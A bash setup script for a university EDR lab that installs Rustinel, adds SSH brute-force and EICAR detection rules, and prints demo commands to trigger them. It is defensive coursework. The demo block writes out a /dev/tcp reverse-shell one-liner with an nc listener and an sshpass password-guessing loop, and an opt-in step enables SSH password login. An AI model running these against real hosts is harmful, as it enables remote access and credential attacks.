#!/usr/bin/env bash
# =============================================================================
# setup-rustinel.sh  —  Activity 5 (Endpoint Detection & Response)
# 3014ICT Assessment 1  |  Chris Grul (s5501035)
# -----------------------------------------------------------------------------
# Runs LOCALLY ON ovc (the OpenVPN client VM). It:
#   1. adds/updates the 3014ICT repo checkout (for the custom rules + automarker)
#   2. installs Rustinel (open-source eBPF EDR) via its published installer
#      (downloaded and SAVED for review first — no blind pipe-to-shell)
#   3. runs `rustinel setup` to install the Linux ESSENTIAL rules pack and
#      register + start the managed systemd service
#   4. drops in the two custom rules this activity needs (SSH brute-force Sigma;
#      an EICAR YARA belt-and-suspenders) and points the config at them
#   5. verifies the pipeline (doctor + the bundled `whoami` demo rule) and prints
#      the three demo commands
#
# The ESSENTIAL pack already covers two of the three demos:
#   * EICAR test file      -> EICAR IOC set (file_scan on process-start)
#   * Reverse shell        -> "Linux Reverse Shell via /dev/tcp" (Sigma)
# The third (SSH brute force) is the custom rule added in step 4 — Rustinel's
# packs don't detect auth-failure brute force natively.
#
# Idempotent: safe to re-run. Requires: Ubuntu on ovc, kernel 5.8+ with BTF,
# sudo rights. Reversible: `sudo rustinel service uninstall` removes the service.
#
# Usage:
#   ./setup-rustinel.sh                 # install + configure + verify
#   ./setup-rustinel.sh --pack advanced # use the Advanced pack instead
#   ./setup-rustinel.sh --enable-ssh-passwords   # ALSO turn on sshd password
#                       auth so the brute-force demo can generate failed attempts
#                       (opt-in; a backup of sshd_config is written; reversible)
# =============================================================================
set -euo pipefail

# ---- Settings ---------------------------------------------------------------
REPO_URL="${REPO_URL:-https://github.com/chris-grul/3014ICT.git}"
REPO_REF="${REPO_REF:-main}"
REPO_DIR="${REPO_DIR:-$HOME/3014ICT}"
SUBDIR="Assessment 1/activity5"
PAT_FILE="${PAT_FILE:-$HOME/gh-pat.key}"     # optional; used only if the repo is private
PACK="essential"                              # essential | advanced
ENABLE_SSH_PW=0
INSTALL_URL="https://rustinel.io/install.sh"
CONFIG="/etc/rustinel/config.toml"

for a in "$@"; do
    case "$a" in
        --pack) : ;; essential|advanced) PACK="$a" ;;
        --pack=*) PACK="${a#*=}" ;;
        --enable-ssh-passwords) ENABLE_SSH_PW=1 ;;
        -h|--help) sed -n '2,40p' "$0"; exit 0 ;;
        *) echo "unknown arg: $a" >&2; exit 2 ;;
    esac
done

say()  { printf '\n\033[1;36m== %s\033[0m\n' "$*"; }
ok()   { printf '  \033[32m[ok]\033[0m %s\n' "$*"; }
info() { printf '  \033[36m[..]\033[0m %s\n' "$*"; }
warn() { printf '  \033[33m[!!]\033[0m %s\n' "$*"; }

# ---- 0. Preflight: kernel / BTF / eBPF prerequisites ------------------------
say "Preflight — eBPF prerequisites (kernel 5.8+ with BTF)"
KREL="$(uname -r)"; KMAJ="${KREL%%.*}"; KMIN="$(echo "$KREL" | cut -d. -f2)"
if [ "$KMAJ" -gt 5 ] || { [ "$KMAJ" -eq 5 ] && [ "$KMIN" -ge 8 ]; }; then
    ok "kernel $KREL (>= 5.8)"
else
    warn "kernel $KREL is < 5.8 — Rustinel's eBPF collector needs 5.8+; it may not start"
fi
if [ -r /sys/kernel/btf/vmlinux ]; then ok "BTF present (/sys/kernel/btf/vmlinux)"; else
    warn "no /sys/kernel/btf/vmlinux — kernel BTF missing; eBPF telemetry may be unavailable"
fi
for fs in tracefs debugfs; do
    if mount 2>/dev/null | grep -q " type $fs "; then ok "$fs mounted"; else
        info "$fs not shown as mounted (Rustinel/`setup` will mount it if it can)"; fi
done

# ---- 1. Add the repo (for the custom rules + the automarker) -----------------
say "Repo — add/update $REPO_DIR"
AUTH=()
if [ -f "$PAT_FILE" ]; then
    PAT="$(tr -d ' \n\r\t' < "$PAT_FILE")"
    AUTH=(-c "http.extraheader=Authorization: Bearer $PAT")   # not persisted in config
fi
if [ -d "$REPO_DIR/.git" ]; then
    git "${AUTH[@]}" -C "$REPO_DIR" fetch --quiet origin "$REPO_REF" \
        && git -C "$REPO_DIR" reset --hard --quiet "origin/$REPO_REF" \
        && ok "updated $REPO_DIR -> origin/$REPO_REF" \
        || warn "could not update repo (offline / private without PAT) — using existing checkout"
elif git "${AUTH[@]}" clone --quiet --branch "$REPO_REF" "$REPO_URL" "$REPO_DIR"; then
    ok "cloned $REPO_URL -> $REPO_DIR"
else
    warn "clone failed — continuing with rules embedded in this script"
fi
unset PAT 2>/dev/null || true
RULES_SRC="$REPO_DIR/$SUBDIR/rules"

# ---- 2. Install Rustinel (download + SAVE for review, then run) --------------
say "Install Rustinel"
if command -v rustinel >/dev/null 2>&1; then
    ok "rustinel already installed: $(command -v rustinel)  ($(rustinel --version 2>/dev/null | head -1))"
else
    TMP="$(mktemp -d)"
    info "downloading installer to $TMP/install.sh (review it before it runs)"
    curl -fsSLo "$TMP/install.sh" "$INSTALL_URL"
    printf '  ----- installer sha256 -----\n'; sha256sum "$TMP/install.sh" | sed 's/^/  /'
    sh "$TMP/install.sh"                 # installs the binary (no --run: we use the service)
    hash -r 2>/dev/null || true
    command -v rustinel >/dev/null 2>&1 && ok "installed: $(command -v rustinel)" \
        || { warn "rustinel not on PATH after install — check $TMP/install.sh output"; exit 1; }
fi

# ---- 3. Managed setup: Essential pack + systemd service ---------------------
say "Rustinel setup — $PACK pack + managed service"
sudo rustinel setup --pack "$PACK" --yes
ok "setup complete (rules pack '$PACK' installed, service registered + started)"

# ---- 4. Install the two custom rules + point the config at them -------------
say "Custom rules (SSH brute-force Sigma + EICAR YARA)"
# Discover the rule dirs the config actually uses; fall back to the managed defaults.
sigdir="$(awk -F\" '/^[[:space:]]*sigma_rules_path/{print $2}' "$CONFIG" 2>/dev/null)"
yardir="$(awk -F\" '/^[[:space:]]*yara_rules_path/{print $2}'  "$CONFIG" 2>/dev/null)"
sigdir="${sigdir:-/var/lib/rustinel/rules/sigma}"
yardir="${yardir:-/var/lib/rustinel/rules/yara}"
sudo mkdir -p "$sigdir" "$yardir"

install_rule() {   # <src-in-repo> <dst-dir> | falls back to embedded copy
    local name="$1" dst="$2"
    if [ -f "$RULES_SRC/$3/$name" ]; then
        sudo install -m 0644 "$RULES_SRC/$3/$name" "$dst/$name" && ok "installed $3/$name (from repo)"
    else
        emit_"$4" | sudo tee "$dst/$name" >/dev/null && ok "installed $3/$name (embedded fallback)"
    fi
}

emit_ssh_sigma() { cat <<'YML'
title: SSH Password Brute Force - Repeated PAM Verification via unix_chkpwd
id: 87d4f965-e566-4d77-8d17-c6fb0c2fe706
status: experimental
description: |
  pam_unix runs the set-uid helper unix_chkpwd on every SSH password attempt
  (success OR failure). A burst of these under sshd indicates an SSH brute force
  (MITRE T1110.001). Custom Activity 5 rule; the packs don't cover auth-failure
  brute force. If ParentImage is unavailable, use the parent-agnostic companion.
logsource: { category: process_creation, product: linux }
detection:
  chkpwd: { Image|endswith: '/unix_chkpwd' }
  parent_sshd: { ParentImage|endswith: '/sshd' }
  condition: chkpwd and parent_sshd
level: high
tags: [attack.credential_access, attack.t1110.001]
YML
}
emit_ssh_sigma_broad() { cat <<'YML'
title: PAM Password Verification via unix_chkpwd (brute-force burst, parent-agnostic)
id: b26ff00d-1c76-4c58-b314-4db751f7faa1
status: experimental
description: |
  Fallback for engines that do not map ParentImage. Matches every unix_chkpwd exec;
  a burst is the brute-force signal. Broader (also su/sudo/login) — prefer the
  sshd-scoped rule where possible.
logsource: { category: process_creation, product: linux }
detection:
  chkpwd: { Image|endswith: '/unix_chkpwd' }
  condition: chkpwd
level: medium
tags: [attack.credential_access, attack.t1110.001]
YML
}
emit_eicar_yara() { cat <<'YAR'
rule EICAR_Test_File
{
    meta:
        description = "EICAR standard anti-malware test string (harmless, NOT malware)"
        reference   = "https://www.eicar.org/download-anti-malware-testfile/"
    strings:
        $eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    condition:
        $eicar
}
YAR
}

install_rule "lin_ssh_bruteforce_unix_chkpwd.yml"       "$sigdir" sigma ssh_sigma
install_rule "lin_ssh_bruteforce_unix_chkpwd_broad.yml" "$sigdir" sigma ssh_sigma_broad
install_rule "eicar_test.yar"                           "$yardir" yara  eicar_yara

# Make sure the scanners + IOC matching are enabled (setup normally sets these).
ensure_toml() {  # <section> <key> <value>
    sudo python3 - "$CONFIG" "$1" "$2" "$3" <<'PY' 2>/dev/null || warn "could not verify [$1] $2 in $CONFIG — check it manually"
import sys,re,pathlib
path,section,key,val=sys.argv[1:5]
p=pathlib.Path(path); t=p.read_text() if p.exists() else ""
want=f"{key} = {val}"
lines=t.splitlines(); out=[]; in_sec=False; done=False; sechdr=f"[{section}]"
for ln in lines:
    s=ln.strip()
    if s.startswith("[") and s.endswith("]"):
        if in_sec and not done: out.append(want); done=True
        in_sec = (s==sechdr)
    if in_sec and re.match(rf"\s*{re.escape(key)}\s*=", ln):
        out.append(want); done=True; continue
    out.append(ln)
if not done:
    if sechdr not in t: out.append(sechdr)
    out.append(want)
p.write_text("\n".join(out)+"\n")
print("set")
PY
}
ensure_toml scanner sigma_enabled true
ensure_toml scanner yara_enabled  true
ensure_toml ioc     enabled        true
ok "scanner (sigma+yara) and IOC matching enabled"

# ---- 4b. (opt-in) enable sshd password auth so the brute-force demo can run --
if [ "$ENABLE_SSH_PW" = 1 ]; then
    say "Enable sshd PasswordAuthentication (opt-in, for the brute-force demo)"
    SSHD=/etc/ssh/sshd_config
    sudo cp -a "$SSHD" "${SSHD}.act5.bak"
    sudo sed -i -E 's/^[#[:space:]]*PasswordAuthentication\s+.*/PasswordAuthentication yes/' "$SSHD"
    grep -qE '^PasswordAuthentication yes' <(sudo cat "$SSHD") || echo 'PasswordAuthentication yes' | sudo tee -a "$SSHD" >/dev/null
    # drop-in files can override sshd_config — neutralise any that force it off
    for d in /etc/ssh/sshd_config.d/*.conf; do
        [ -e "$d" ] || continue
        sudo sed -i -E 's/^[#[:space:]]*PasswordAuthentication\s+no/PasswordAuthentication yes/' "$d"
    done
    sudo sshd -t && sudo systemctl restart ssh 2>/dev/null || sudo systemctl restart sshd 2>/dev/null || true
    ok "PasswordAuthentication enabled (backup: ${SSHD}.act5.bak — revert after the demo)"
fi

# ---- 5. Reload the service so the custom rules load, then verify -------------
say "Reload + verify"
sudo rustinel service restart 2>/dev/null || sudo systemctl restart rustinel 2>/dev/null || true
sleep 2
sudo rustinel service status || true
echo; info "health check:"; sudo rustinel doctor || true

# Bundled demo rule: running whoami should produce an alert.
ALERTDIR="$(awk -F\" '/^[[:space:]]*directory/{print $2}' "$CONFIG" 2>/dev/null)"; ALERTDIR="${ALERTDIR:-/var/log/rustinel}"
echo; info "triggering the bundled 'whoami' demo rule…"; whoami >/dev/null; sleep 2
if sudo sh -c "ls $ALERTDIR/alerts.json* >/dev/null 2>&1"; then
    ok "alerts are being written to $ALERTDIR/alerts.json*"
    sudo sh -c "tail -n 2 $ALERTDIR/alerts.json* 2>/dev/null" | sed 's/^/    /' || true
else
    warn "no alert file yet in $ALERTDIR — check 'sudo rustinel doctor' and 'journalctl -u rustinel'"
fi

# ---- 6. Print the three demo commands --------------------------------------
say "Activity 5 demos (run these to test the tool)"
cat <<EOF
  1) EICAR test file (download, then execute so the scan-on-process-start fires):
       wget -qO ~/eicar.com https://secure.eicar.org/eicar.com.txt
       chmod +x ~/eicar.com && ~/eicar.com 2>/dev/null; echo done
     (Rustinel scans on process-start, so the file must be EXECUTED, not just saved.
      If wget is unavailable, the README has an offline echo-the-signature method.)
     -> expect an EICAR IOC/YARA alert in $ALERTDIR/alerts.json*

  2) Network intrusion — reverse shell via /dev/tcp (fires the bundled Sigma rule):
       # start a listener on a reachable lab host first, e.g. on igw:  nc -lvnp 4444
       bash -i >& /dev/tcp/10.8.0.1/4444 0>&1
     -> expect a "Linux Reverse Shell via /dev/tcp" alert

  3) SSH brute force (fires the custom rule; needs sshd password auth ON — see
     --enable-ssh-passwords). From an attacker host, hammer ovc's SSH with wrong
     passwords, e.g.:
       for i in \$(seq 1 20); do sshpass -p wrong\$i ssh -o StrictHostKeyChecking=no \\
         -o PreferredAuthentications=password user@<ovc-vpn-addr> true; done
     -> expect a burst of "SSH Password Brute Force … unix_chkpwd" alerts

  Tail alerts live:   sudo tail -f $ALERTDIR/alerts.json*
  Remove everything:  sudo rustinel service uninstall
EOF
ok "Activity 5 setup finished"
